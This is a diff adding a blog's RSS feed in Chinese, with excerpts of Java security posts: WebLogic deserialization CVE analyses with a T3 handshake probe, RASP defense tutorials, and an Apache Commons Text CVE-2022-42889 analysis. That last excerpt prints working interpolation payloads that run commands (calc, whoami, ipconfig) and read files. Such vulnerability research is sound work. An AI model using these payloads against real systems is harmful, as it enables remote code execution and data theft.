@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JavaSec on Snakinya</title>
+    <link>http://localhost:1313/categories/javasec/</link>
+    <description>Recent content in JavaSec on Snakinya</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>cn</language>
+    <lastBuildDate>Tue, 22 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/javasec/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Weblogic | CVE-2016-0638分析</title>
+      <link>http://localhost:1313/posts/cve-2016-0638bypass-cve-2015-4852/</link>
+      <pubDate>Tue, 22 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/cve-2016-0638bypass-cve-2015-4852/</guid>
+      <description>引言 这个漏洞是对于CVE-2015-4852的绕过，在了解具体防御措施之前我们先学习一下Java原生类反序列化的内部调用
+对于CVE-2015-4852漏洞，官方的做法是在resolveClass处添加了黑名单，resolveClass方法的作用是将类的序列化描述符加工成该类的Class对象。
+如果在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样一来，恶意类无法生成Class，从而能够一定程度上防御反序列化攻击。
+环境搭建 首先下载补丁：https://pan.baidu.com/s/1hrGJNNI
+CVE-2015-4852的修复补丁为p21984589_1036_Generic。这使用p20780171_1036_Generic和p22248372_1036012_Generic这两个补丁包，p21984589_1036_Generic是前面这两个补丁包的集成。
+之后将补丁部署到weblogic server并重启服务，将打完补丁后到代码复制到宿主机开始分析。
+命令集合： docker cp p20780171_1036_Generic weblogic1036jdk7u21:/p20780171_1036_Generic docker cp p22248372_1036012_Generic weblogic1036jdk7u21:/p22248372_1036012_Generic docker exec -it weblogic1036jdk7u21 /bin/bash cd /u01/app/oracle/middleware/utils/bsu mkdir cache_dir vi bsu.sh 编辑MEM_ARGS参数为 -Xms512m -Xmx1024m cp /p20780171_1036_Generic/* cache_dir/ ./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver/ cp /p22248372_1036012_Generic/* cache_dir/ ./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=ZLNA -prod_dir=/u01/app/oracle/middleware/wlserver/ –verbose /u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh 补丁分析 该漏洞的补丁主要作用在
+weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream weblogic.rjvm.MsgAbbrevInputStream.class weblogic.iiop.Utils.class 可以发现多了一步判断ClassFilter.isBlackListed
+黑名单如下
+private static final String DEFAULT_BLACK_LIST = &amp;#34;+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure&amp;#34;; 漏洞分析 想要绕过补丁，我们需要找一个黑名单之外的类，可以其readObject中创建自己的InputStream的对象，然后调用该readObject 方法进行反序列化，这样就可以执行含有恶意代码的序列化代码。
+对于该漏洞我们利用的是：weblogic.jms.common.StreamMessageImpl#readExternal()</description>
+    </item>
+    
+    <item>
+      <title>Weblogic | CVE-2015-4852分析</title>
+      <link>http://localhost:1313/posts/cve-2015-4852/</link>
+      <pubDate>Mon, 21 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/cve-2015-4852/</guid>
+      <description>环境配置 工具：https://github.com/QAX-A-Team/WeblogicEnvironment
+jdk地址：https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html
+weblogic下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html
+下载并配置好依赖后，脚本一键运行，我的本机为macos m2架构
+需要修改Dockerfile
+# 基础镜像 FROM --platform=linux/amd64 centos # 参数 ARG JDK_PKG ARG WEBLOGIC_JAR # 解决libnsl包丢失的问题 # RUN yum -y install libnsl T3协议 T3 协议是 Weblogic RMI 调用时的通信协议
+RMI 即远程方法调用，我们可以远程调用另一台 JVM虚拟机中对象上的方法，且数据传输过程中是序列化进行传输的
+Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特性。以下是T3协议的特点：
+服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。 请求测试 import socket def T3Test(ip,port): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ip, port)) handshake = &amp;#34;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&amp;#34; #请求包的头 sock.sendall(handshake.encode()) while True: data = sock.recv(1024) print(data.</description>
+    </item>
+    
+    <item>
+      <title>RASP技术学习入门篇(1)</title>
+      <link>http://localhost:1313/posts/rasp1/</link>
+      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/rasp1/</guid>
+      <description>Java RASP技术 运行时应用程序自我保护（Runtime application self-protection，简称RASP）使用Java Agent技术在应用程序运行时候动态编辑类字节码，将自身防御逻辑注入到Java底层API和Web应用程序当中，从而与应用程序融为一体，能实时分析和检测Web攻击，使应用程序具备自我保护能力。
+RASP技术作为新兴的WEB防御方案，不但能够有效的防御传统WAF无法实现的攻击类型，更能够大幅提升对攻击者攻击行为的检测精准度。RASP是传统WAF的坚实后盾，能够弥补WAF无法获取Web应用运行时环境的缺陷，同时也是传统Web应用服务最重要的不可或缺的一道安全防线。
+RASP通过注入自身到开发语言底层API中，从而完全的融入于Web服务中，拥有了得天独厚的漏洞检测和防御条件，RASP技术相较于传统的WAF拥有了更加精准、深层次的防御。RASP采用基于攻击行为分析的主动防御机制，严防文件读写、数据访问、命令执行等Web应用系统命脉，为Web应用安全筑建出“万丈高墙”。
+RASP技术原理 JDK1.5开始，Java新增了Instrumentation（Java Agent API）和JVMTI（JVM Tool Interface）功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class（类字节码）进行重新加载（Retransform）。
+利用Java Agent这一特性衍生出了APM（Application Performance Management，应用性能管理）、RASP（Runtime application self-protection，运行时应用自我保护）、IAST（Interactive Application Security Testing，交互式应用程序安全测试）等相关产品，它们都无一例外的使用了Instrumentation/JVMTI的API来实现动态修改Java类字节码并插入监控或检测代码。
+RASP防御的核心就是在Web应用程序执行关键的Java API之前插入防御逻辑，从而控制原类方法执行的业务逻辑。如果没有RASP的防御，攻击者可以利用Web容器/应用的漏洞攻击应用服务器。
+项目地址 https://github.com/iiiusky/java_rasp_example
+实现一个简易的RASP 创建入口类 在cn.org.javaweb.agent包下新建一个类。
+package cn.org.javaweb.agent; import java.lang.instrument.Instrumentation; public class Agent { public static void premain(String agentArgs, Instrumentation inst) { inst.addTransformer(new AgentTransform()); } } 创建Transform 然后我们再新建一个AgentTransform类，该类需要实现ClassFileTransformer的方法，内容如下:
+package cn.org.javaweb.agent; import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class AgentTransform implements ClassFileTransformer { /** * @param loader * @param className * @param classBeingRedefined * @param protectionDomain * @param classfileBuffer * @return * @throws IllegalClassFormatException */ @Override public byte[] transform(ClassLoader loader, String className, Class&amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>RASP技术学习入门篇(2)</title>
+      <link>http://localhost:1313/posts/rasp2/</link>
+      <pubDate>Tue, 21 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/rasp2/</guid>
+      <description>项目地址 https://github.com/xbeark/javaopenrasp
+简介 该rasp相比于上一篇文章的项目复杂许多，这次希望能够更深入了解rasp的实现思路
+该项目实现的保护点：
+RCE
+反序列化漏洞 Ognl表达式执行 ProcessBuilder log SQL注入
+MySql注入保护 SQLServer注入保护 代码浅析 首先看到入口xbear/javaopenrasp/Agent.java，该类实现了premain函数也就是运行前加载的方式
+public class Agent { public static void premain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException { Console.log(&amp;#34;init&amp;#34;); init(); inst.addTransformer(new ClassTransformer()); } private static boolean init() { Config.initConfig(); return true; } } 这里跟进Config.initConfig()，进行配置初始化
+函数从main.config中读入配置并将其存入tmpMap
+配置文件为json格式
+文件中的参数含义：
+&amp;#34;moudleName&amp;#34;: 顾名思义，需要监控的类名 &amp;#34;loadClass&amp;#34;: 加载的classvisitor，用以拦截或日志记录 &amp;#34;mode&amp;#34;: 拦截模式，log,black,block,check &amp;#34;whiteList&amp;#34;:白名单 &amp;#34;blackList&amp;#34;: 黑名单 读取配置后进入ClassTransformer
+ClassReader reader = new ClassReader(classfileBuffer); ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS); ClassVisitor visitor = Reflections.</description>
+    </item>
+    
+    <item>
+      <title>漏洞分析 | Apache Commons Text RCE(CVE-2022-42889)分析</title>
+      <link>http://localhost:1313/posts/apache-commons-text-rcecve-2022-42889/</link>
+      <pubDate>Sun, 29 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/posts/apache-commons-text-rcecve-2022-42889/</guid>
+      <description>漏洞信息 https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om
+漏洞复现 添加依赖
+&amp;lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-text --&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.commons&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;commons-text&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.9&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; 复现代码
+import org.apache.commons.text.StringSubstitutor; public class CVE_2022_42889 { public static void main(String[] args) { StringSubstitutor interpolator = StringSubstitutor.createInterpolator(); interpolator.replace(&amp;#34;${script:js:java.lang.Runtime.getRuntime().exec(\&amp;#34;calc\&amp;#34;)}&amp;#34;); } } 漏洞分析 漏洞中提到漏洞关键点在于org.apache.commons.text.lookup.StringLookup
+先跟一下poc流程：
+跟进substitute方法
+跟进resolveVariable方法
+这里跟进lookup方法，其为一个接口
+poc使用的是InterpolatorStringLookup
+这里获取:前的内容赋给 prefix(此处会进行小写处理)，后半部分赋给 name。
+接着在 stringLookupMap 查看是否存在对应的键名，如果存在则会调用 StringLookup#lookup 方法
+这些键名在DefaultStringLookup中
+跟进ScriptStringLookup#lookup
+这里调用了scriptEngine.eval执行:后面的语句，scriptEngine由:前的字符串决定，也就是javascript，所以不难理解payload
+${script:js:java.lang.Runtime.getRuntime().exec(&amp;#34;calc&amp;#34;)} 补充 利用方式：
+script回显
+${script:js:new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(&amp;#34;whoami&amp;#34;).start().getInputStream(), &amp;#34;GBK&amp;#34;)).readLine()} // 只能读取一行 ${script:js:new java.util.Scanner(new java.lang.ProcessBuilder(&amp;#34;ipconfig&amp;#34;).start().getInputStream(), &amp;#34;GBK&amp;#34;).useDelimiter(&amp;#34;xzxzxz&amp;#34;).next()} ResourceBundle读取配置文件
+${resourcebundle:application:user.name} file读文件
+${file:utf-8:d:/test.txt} url读文件/ssrf</description>
+    </item>
+    
+  </channel>
+</rss>
